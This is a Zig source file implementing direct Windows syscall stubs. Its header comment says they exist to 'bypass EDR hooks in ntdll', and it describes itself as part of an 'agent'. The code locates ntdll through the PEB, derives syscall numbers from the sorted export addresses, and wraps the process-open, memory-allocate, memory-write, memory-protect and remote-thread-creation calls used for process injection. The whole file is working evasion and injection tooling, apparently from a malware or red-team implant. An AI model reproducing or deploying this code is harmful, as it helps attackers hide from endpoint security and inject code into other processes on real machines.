//! Direct Windows syscall stubs — bypass EDR hooks in ntdll.
//!
//! Strategy: walk the PEB to find ntdll base, parse its export table to
//! collect every Nt* function RVA, then sort by RVA to derive SSNs
//! (each function's position in the sorted list is its syscall number).
//! Stubs execute the `syscall` instruction directly with args placed in
//! the registers/stack slots the Windows kernel expects.
//!
//! This file compiles to a no-op stub on non-Windows targets so the rest
//! of the agent can @import it unconditionally.

const std = @import("std");
const builtin = @import("builtin");

// ─── Windows-only implementation ────────────────────────────────────────────

const is_windows = builtin.os.tag == .windows;

// ─── NT status / handle types ───────────────────────────────────────────────

pub const NTSTATUS  = u32;
pub const HANDLE    = *anyopaque;
pub const PVOID     = *anyopaque;
pub const PSIZE_T   = *usize;
pub const PULONG    = *u32;
pub const STATUS_SUCCESS: NTSTATUS = 0;

// ─── PEB / loader structures ─────────────────────────────────────────────────

const UNICODE_STRING = extern struct {
    Length:        u16,
    MaximumLength: u16,
    _pad:          u32 = 0,
    Buffer:        [*]u16,
};

const LIST_ENTRY = extern struct {
    Flink: *LIST_ENTRY,
    Blink: *LIST_ENTRY,
};

const LDR_ENTRY = extern struct {
    InLoadOrderLinks:        LIST_ENTRY,
    InMemoryOrderLinks:      LIST_ENTRY,
    InInitializationOrderLinks: LIST_ENTRY,
    DllBase:                 usize,
    EntryPoint:              usize,
    SizeOfImage:             u32,
    _pad:                    u32 = 0,
    FullDllName:             UNICODE_STRING,
    BaseDllName:             UNICODE_STRING,
};

const PEB_LDR_DATA = extern struct {
    Length:                          u32,
    Initialized:                     u8,
    _pad:                            [3]u8,
    SsHandle:                        usize,
    InLoadOrderModuleList:           LIST_ENTRY,
    InMemoryOrderModuleList:         LIST_ENTRY,
    InInitializationOrderModuleList: LIST_ENTRY,
};

const PEB64 = extern struct {
    _reserved0: [2]u8,
    BeingDebugged: u8,
    _reserved1: [21]u8,
    Ldr: *PEB_LDR_DATA,
};

const IMAGE_EXPORT_DIRECTORY = extern struct {
    Characteristics:       u32,
    TimeDateStamp:         u32,
    MajorVersion:          u16,
    MinorVersion:          u16,
    Name:                  u32,
    Base:                  u32,
    NumberOfFunctions:     u32,
    NumberOfNames:         u32,
    AddressOfFunctions:    u32,
    AddressOfNames:        u32,
    AddressOfNameOrdinals: u32,
};

// ─── SSN catalogue ───────────────────────────────────────────────────────────

/// Indices into ssn_cache — must stay in sync with `target_names` below.
pub const SsnId = enum(usize) {
    NtProtectVirtualMemory  = 0,
    NtAllocateVirtualMemory = 1,
    NtWriteVirtualMemory    = 2,
    NtCreateThreadEx        = 3,
    NtOpenProcess           = 4,
};

const SSN_COUNT = 5;

const target_names = [SSN_COUNT][]const u8{
    "NtProtectVirtualMemory",
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtCreateThreadEx",
    "NtOpenProcess",
};

var ssn_cache: [SSN_COUNT]u32 = [_]u32{0xFFFFFFFF} ** SSN_COUNT;
var ssn_ready: bool = false;

// ─── PEB walk ────────────────────────────────────────────────────────────────

fn ntdllBase() ?usize {
    if (!is_windows) return null;
    if (comptime builtin.cpu.arch != .x86_64) return null;

    const peb: *PEB64 = asm volatile (
        \\ movq %%gs:0x60, %[peb]
        : [peb] "=r" (-> *PEB64)
        :
        :
    );

    const ldr = peb.Ldr;
    var entry = ldr.InLoadOrderModuleList.Flink;
    const head = &ldr.InLoadOrderModuleList;

    // ntdll.dll — BaseDllName.Length == 18 bytes (9 wide chars)
    while (entry != head) : (entry = entry.Flink) {
        const mod: *LDR_ENTRY = @fieldParentPtr("InLoadOrderLinks", entry);
        const name = mod.BaseDllName;
        if (name.Length == 18 and mod.DllBase != 0) {
            // Compare "ntdll.dll" case-insensitively (9 chars = 18 bytes)
            const expected = [9]u16{ 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l' };
            var match = true;
            for (0..9) |i| {
                var c = name.Buffer[i];
                if (c >= 'A' and c <= 'Z') c += 32;
                if (c != expected[i]) { match = false; break; }
            }
            if (match) return mod.DllBase;
        }
    }
    return null;
}

// ─── Export table parser ─────────────────────────────────────────────────────

fn exportDir(base: usize) ?*IMAGE_EXPORT_DIRECTORY {
    const dos_magic = @as(*u16, @ptrFromInt(base)).*;
    if (dos_magic != 0x5A4D) return null; // MZ

    const e_lfanew = @as(*u32, @ptrFromInt(base + 0x3C)).*;
    const pe_sig   = @as(*u32, @ptrFromInt(base + e_lfanew)).*;
    if (pe_sig != 0x00004550) return null; // PE\0\0

    // Optional header starts at PE sig + 4 (COFF hdr size) + 20 (COFF fields)
    // Export directory RVA is at optional header offset 112 (DataDirectory[0].VirtualAddress)
    const opt_hdr  = base + e_lfanew + 4 + 20;
    const exp_rva  = @as(*u32, @ptrFromInt(opt_hdr + 112)).*;
    if (exp_rva == 0) return null;

    return @ptrFromInt(base + exp_rva);
}

// ─── SSN resolution ──────────────────────────────────────────────────────────

pub fn resolveAll() bool {
    if (ssn_ready) return true;
    if (!is_windows) return false;
    if (comptime builtin.cpu.arch != .x86_64) return false;

    const base = ntdllBase() orelse return false;
    const exp   = exportDir(base) orelse return false;

    const n_names = exp.NumberOfNames;
    const names_rva = @as([*]u32, @ptrFromInt(base + exp.AddressOfNames));
    const ords_rva  = @as([*]u16, @ptrFromInt(base + exp.AddressOfNameOrdinals));
    const funcs_rva = @as([*]u32, @ptrFromInt(base + exp.AddressOfFunctions));

    // Pass 1 — collect RVAs for our targets
    var target_rvas: [SSN_COUNT]u32 = [_]u32{0} ** SSN_COUNT;
    var i: usize = 0;
    while (i < n_names) : (i += 1) {
        const name_ptr: [*:0]u8 = @ptrFromInt(base + names_rva[i]);
        const ord = ords_rva[i];
        const rva = funcs_rva[ord];

        for (target_names, 0..) |tgt, ti| {
            var match = true;
            for (tgt, 0..) |c, ci| {
                if (name_ptr[ci] != c) { match = false; break; }
            }
            if (match and name_ptr[tgt.len] == 0) {
                target_rvas[ti] = rva;
            }
        }
    }

    // Verify all targets were found
    for (target_rvas) |rva| {
        if (rva == 0) return false;
    }

    // Pass 2 — SSN = count of Nt* stubs with smaller RVA than target
    for (target_rvas, 0..) |target_rva, ti| {
        var count: u32 = 0;
        var j: usize = 0;
        while (j < n_names) : (j += 1) {
            const name_ptr: [*:0]u8 = @ptrFromInt(base + names_rva[j]);
            // Only count functions starting with "Nt" (but not "Ntdll")
            if (name_ptr[0] == 'N' and name_ptr[1] == 't' and name_ptr[2] != 'd') {
                const ord = ords_rva[j];
                const rva = funcs_rva[ord];
                if (rva < target_rva) count += 1;
            }
        }
        ssn_cache[ti] = count;
    }

    ssn_ready = true;
    return true;
}

pub fn ssn(id: SsnId) u32 {
    return ssn_cache[@intFromEnum(id)];
}

// ─── Syscall dispatchers ─────────────────────────────────────────────────────
// Windows x64 kernel ABI:
//   arg1 → r10 (not rcx — syscall clobbers rcx to save RIP)
//   arg2 → rdx, arg3 → r8, arg4 → r9
//   arg5 → [rsp+0x28], arg6 → [rsp+0x30]
//   Shadow space [rsp+0x00..0x1F] is allocated but unused by the kernel.
//   We allocate 0x40 bytes: shadow(0x20) + padding(0x08) + arg5(0x08) + arg6(0x08) = 0x40.

fn sc4(nr: u32, a1: usize, a2: usize, a3: usize, a4: usize) usize {
    return asm volatile (
        \\ syscall
        : [ret] "={rax}" (-> usize)
        : [nr] "{eax}" (@as(u32, nr)),
          [a1] "{r10}" (a1),
          [a2] "{rdx}" (a2),
          [a3] "{r8}"  (a3),
          [a4] "{r9}"  (a4)
        : "rcx", "r11", "memory"
    );
}

fn sc5(nr: u32, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) usize {
    return asm volatile (
        \\ sub $0x40, %%rsp
        \\ movq %[a5], 0x28(%%rsp)
        \\ syscall
        \\ add $0x40, %%rsp
        : [ret] "={rax}" (-> usize)
        : [nr] "{eax}" (@as(u32, nr)),
          [a1] "{r10}" (a1),
          [a2] "{rdx}" (a2),
          [a3] "{r8}"  (a3),
          [a4] "{r9}"  (a4),
          [a5] "r"     (a5)
        : "rcx", "r11", "memory"
    );
}

fn sc6(nr: u32, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize) usize {
    return asm volatile (
        \\ sub $0x40, %%rsp
        \\ movq %[a5], 0x28(%%rsp)
        \\ movq %[a6], 0x30(%%rsp)
        \\ syscall
        \\ add $0x40, %%rsp
        : [ret] "={rax}" (-> usize)
        : [nr] "{eax}" (@as(u32, nr)),
          [a1] "{r10}" (a1),
          [a2] "{rdx}" (a2),
          [a3] "{r8}"  (a3),
          [a4] "{r9}"  (a4),
          [a5] "r"     (a5),
          [a6] "r"     (a6)
        : "rcx", "r11", "memory"
    );
}

// ─── OBJECT_ATTRIBUTES / CLIENT_ID ───────────────────────────────────────────

pub const OBJECT_ATTRIBUTES = extern struct {
    Length:                   u32 = @sizeOf(OBJECT_ATTRIBUTES),
    RootDirectory:            usize = 0,
    ObjectName:               usize = 0,
    Attributes:               u32 = 0,
    SecurityDescriptor:       usize = 0,
    SecurityQualityOfService: usize = 0,
};

pub const CLIENT_ID = extern struct {
    UniqueProcess: usize,
    UniqueThread:  usize,
};

// ─── Public NT wrappers ──────────────────────────────────────────────────────

pub fn NtProtectVirtualMemory(
    process_handle:  usize,
    base_address:    *usize,
    region_size:     *usize,
    new_protect:     u32,
    old_protect:     *u32,
) NTSTATUS {
    return @truncate(sc5(
        ssn(.NtProtectVirtualMemory),
        process_handle,
        @intFromPtr(base_address),
        @intFromPtr(region_size),
        new_protect,
        @intFromPtr(old_protect),
    ));
}

pub fn NtAllocateVirtualMemory(
    process_handle: usize,
    base_address:   *usize,
    zero_bits:      usize,
    region_size:    *usize,
    alloc_type:     u32,
    protect:        u32,
) NTSTATUS {
    return @truncate(sc6(
        ssn(.NtAllocateVirtualMemory),
        process_handle,
        @intFromPtr(base_address),
        zero_bits,
        @intFromPtr(region_size),
        alloc_type,
        protect,
    ));
}

pub fn NtWriteVirtualMemory(
    process_handle:    usize,
    base_address:      usize,
    buffer:            usize,
    number_of_bytes:   usize,
    bytes_written:     *usize,
) NTSTATUS {
    return @truncate(sc5(
        ssn(.NtWriteVirtualMemory),
        process_handle,
        base_address,
        buffer,
        number_of_bytes,
        @intFromPtr(bytes_written),
    ));
}

pub fn NtOpenProcess(
    process_handle: *usize,
    desired_access: u32,
    obj_attrs:      *OBJECT_ATTRIBUTES,
    client_id:      *CLIENT_ID,
) NTSTATUS {
    return @truncate(sc4(
        ssn(.NtOpenProcess),
        @intFromPtr(process_handle),
        desired_access,
        @intFromPtr(obj_attrs),
        @intFromPtr(client_id),
    ));
}

pub fn NtCreateThreadEx(
    thread_handle:    *usize,
    desired_access:   u32,
    obj_attrs:        usize,
    process_handle:   usize,
    start_routine:    usize,
    argument:         usize,
    create_flags:     u32,
    zero_bits:        usize,
    stack_size:       usize,
    maximum_stack:    usize,
    attribute_list:   usize,
) NTSTATUS {
    // NtCreateThreadEx has 11 args — use multiple sc6 calls via the stack manually.
    // We split: first 4 in registers, args 5-6 via sc6's stack slots, remaining
    // args 7-11 need a trampoline. For simplicity and correctness, use a single
    // inline asm block with the full stack setup.
    return asm volatile (
        \\ sub $0x70, %%rsp
        \\ movq %[a5],  0x28(%%rsp)
        \\ movq %[a6],  0x30(%%rsp)
        \\ movq %[a7],  0x38(%%rsp)
        \\ movq %[a8],  0x40(%%rsp)
        \\ movq %[a9],  0x48(%%rsp)
        \\ movq %[a10], 0x50(%%rsp)
        \\ movq %[a11], 0x58(%%rsp)
        \\ syscall
        \\ add $0x70, %%rsp
        : [ret] "={rax}" (-> NTSTATUS)
        : [nr]  "{eax}"  (@as(u32, ssn(.NtCreateThreadEx))),
          [a1]  "{r10}"  (@intFromPtr(thread_handle)),
          [a2]  "{rdx}"  (@as(usize, desired_access)),
          [a3]  "{r8}"   (obj_attrs),
          [a4]  "{r9}"   (process_handle),
          [a5]  "r"      (start_routine),
          [a6]  "r"      (argument),
          [a7]  "r"      (@as(usize, create_flags)),
          [a8]  "r"      (zero_bits),
          [a9]  "r"      (stack_size),
          [a10] "r"      (maximum_stack),
          [a11] "r"      (attribute_list)
        : "rcx", "r11", "memory"
    );
}
